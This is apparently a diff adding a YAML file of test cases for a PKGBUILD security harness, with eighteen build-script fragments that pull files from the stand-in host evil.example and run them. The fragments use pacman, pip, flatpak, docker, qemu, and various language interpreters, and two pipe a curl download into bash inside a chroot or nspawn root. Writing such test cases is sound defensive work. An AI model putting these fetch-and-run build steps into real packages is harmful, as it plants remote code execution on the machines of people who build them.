@@ -1,0 +1,183 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+              "https://evil.example/pkg/malicious.pkg.tar.zst")
+      sha256sums=('0000000000000000000000000000000000000000000000000000000000000000'
+                  'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
+
+      build() {
+        pacman -U --noconfirm https://evil.example/pkg/malicious.pkg.tar.zst
+  id: 01-pacman-remote-url
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz")
+      sha256sums=('0000000000000000000000000000000000000000000000000000000000000000')
+
+      build() {
+        docker run --rm evil/example:latest
+  id: 02-docker-run
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+              "https://evil.example/rootfs.tar.gz")
+      sha256sums=('0000000000000000000000000000000000000000000000000000000000000000'
+                  'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb')
+
+      build() {
+        mkdir -p "$srcdir/rootfs"
+        tar -xzf "$srcdir/rootfs.tar.gz" -C "$srcdir/rootfs"
+        systemd-nspawn -D "$srcdir/rootfs" /bin/sh -c "curl -fsSL https://evil.example/stage.sh | bash"
+  id: 03-systemd-nspawn
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+              "https://evil.example/rootfs.tar.gz")
+      sha256sums=('0000000000000000000000000000000000000000000000000000000000000000'
+                  'cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')
+
+      build() {
+        mkdir -p "$srcdir/rootfs"
+        tar -xzf "$srcdir/rootfs.tar.gz" -C "$srcdir/rootfs"
+        chroot "$srcdir/rootfs" /bin/bash -c "curl -fsSL https://evil.example/stage.sh | bash"
+  id: 04-chroot-rootfs
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+              "https://evil.example/payload.js")
+      sha256sums=('0000000000000000000000000000000000000000000000000000000000000000'
+                  'dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd')
+
+      build() {
+        node "$srcdir/payload.js"
+  id: 05-node-declared-source
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+              "https://evil.example/payload.go")
+      sha256sums=('0000000000000000000000000000000000000000000000000000000000000000'
+                  'eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee')
+
+      build() {
+        go run "$srcdir/payload.go"
+  id: 06-go-run
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+              "https://evil.example/payload.tar.gz")
+      sha256sums=('0000000000000000000000000000000000000000000000000000000000000000'
+                  'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
+
+      build() {
+        tar -xzf "$srcdir/payload.tar.gz" -C "$srcdir"
+        cd "$srcdir/payload"
+        cargo run
+  id: 07-cargo-run
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz")
+      sha256sums=('0000000000000000000000000000000000000000000000000000000000000000')
+
+      build() {
+        flatpak install -y --noninteractive flathub com.evil.Example
+        flatpak run com.evil.Example
+  id: 08-flatpak-install
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+              "https://evil.example/vm.qcow2")
+      sha256sums=('0000000000000000000000000000000000000000000000000000000000000000'
+                  '1111111111111111111111111111111111111111111111111111111111111111')
+
+      build() {
+        qemu-system-x86_64 -nographic -drive file="$srcdir/vm.qcow2",format=qcow2
+  id: 09-qemu-image
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz")
+      sha256sums=('0000000000000000000000000000000000000000000000000000000000000000')
+
+      build() {
+        pip install https://evil.example/pkg/malicious.tar.gz
+  id: 10-pip-install-url
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+              "https://evil.example/payload.ts")
+      sha256sums=('0000000000000000000000000000000000000000000000000000000000000000'
+                  '2222222222222222222222222222222222222222222222222222222222222222')
+
+      build() {
+        deno run "$srcdir/payload.ts"
+  id: 11-deno-declared-source
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+              "https://evil.example/payload.php")
+      sha256sums=('0000000000000000000000000000000000000000000000000000000000000000'
+                  '3333333333333333333333333333333333333333333333333333333333333333')
+
+      build() {
+        php "$srcdir/payload.php"
+  id: 12-php-declared-source
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+              "https://evil.example/payload.lua")
+      sha256sums=('0000000000000000000000000000000000000000000000000000000000000000'
+                  '4444444444444444444444444444444444444444444444444444444444444444')
+
+      build() {
+        lua "$srcdir/payload.lua"
+  id: 13-lua-declared-source
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+              "https://evil.example/payload.tcl")
+      sha256sums=('0000000000000000000000000000000000000000000000000000000000000000'
+                  '5555555555555555555555555555555555555555555555555555555555555555')
+
+      build() {
+        tclsh "$srcdir/payload.tcl"
+  id: 14-tclsh-declared-source
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+              "https://evil.example/payload.jl")
+      sha256sums=('0000000000000000000000000000000000000000000000000000000000000000'
+                  '6666666666666666666666666666666666666666666666666666666666666666')
+
+      build() {
+        julia "$srcdir/payload.jl"
+  id: 15-julia-declared-source
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+              "https://evil.example/payload.R")
+      sha256sums=('0000000000000000000000000000000000000000000000000000000000000000'
+                  '7777777777777777777777777777777777777777777777777777777777777777')
+
+      build() {
+        Rscript "$srcdir/payload.R"
+  id: 16-rscript-declared-source
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+              "https://evil.example/payload.pl")
+      sha256sums=('0000000000000000000000000000000000000000000000000000000000000000'
+                  '8888888888888888888888888888888888888888888888888888888888888888')
+
+      build() {
+        perl "$srcdir/payload.pl"
+  id: 17-perl-declared-source-control
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+              "https://evil.example/payload.rb")
+      sha256sums=('0000000000000000000000000000000000000000000000000000000000000000'
+                  '9999999999999999999999999999999999999999999999999999999999999999')
+
+      build() {
+        ruby "$srcdir/payload.rb"
+  id: 18-ruby-declared-source-control
